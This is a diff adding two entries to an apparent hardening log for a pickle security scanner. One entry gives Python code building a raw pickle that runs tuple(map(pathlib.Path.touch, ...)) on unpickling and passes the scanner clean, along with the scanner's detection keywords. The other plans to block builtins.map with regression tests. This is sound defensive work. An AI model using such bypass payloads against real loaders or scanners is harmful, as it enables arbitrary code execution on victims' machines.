@@ -494,3 +494,87 @@ Blocking plan:
 
 Performance note: the fix is a single additional binary-search entry. It does
 not add callable-flow analysis or any extra string scanning.
+
+## Turn 15 - `builtins.map` forced-iteration call gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_builtins_map_tuple_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("builtins"),
+        s("tuple"),
+        b"\x93",
+        s("builtins"),
+        s("map"),
+        b"\x93",
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93",
+        b"]",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_builtins_map_tuple_marker"),
+        b"tRa",
+        b"\x86R",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_builtins_map_tuple_marker` and returns
+  `(None,)`
+- RCE mechanism: the pickle constructs `map(pathlib.Path.touch, [marker])`,
+  then immediately calls `tuple(...)` on that map object. `map()` stores an
+  attacker-selected callable and arguments, while `tuple()` forces iteration
+  during unpickling, invoking the callable. The marker proof uses
+  `pathlib.Path.touch`, but the same pattern can invoke attacker-chosen
+  importable callables with attacker-controlled iterable arguments.
+
+Why the scanner missed it:
+
+- `builtins.map` and `builtins.tuple` are not in `BUILTIN_DANGEROUS_NAMES`.
+- The payload uses only currently clean globals: `builtins.tuple`,
+  `builtins.map`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is a policy coverage gap around a lazy arbitrary-call
+sink that can be forced by another benign builtin. The narrow next block is to
+add `map` to `BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression
+that proves scan-time detection before unpickle-time marker creation.
+
+## Turn 16 - Block `builtins.map`
+
+Blocking plan:
+
+- Add `map` to `BUILTIN_DANGEROUS_NAMES`. `tuple` stays allowed because the
+  arbitrary-call sink is `map`; `tuple` only forces iteration.
+- Add portable policy coverage for raw `GLOBAL builtins map` reductions.
+- Add a CPython oracle regression that manually builds
+  `tuple(map(pathlib.Path.touch, [marker]))`, verifies scanner detection, then
+  verifies the marker file appears only during unpickle.
+
+Performance note: the fix adds one string to the small builtin-name
+membership check. It does not add iterable-flow analysis or broader string
+scanning.
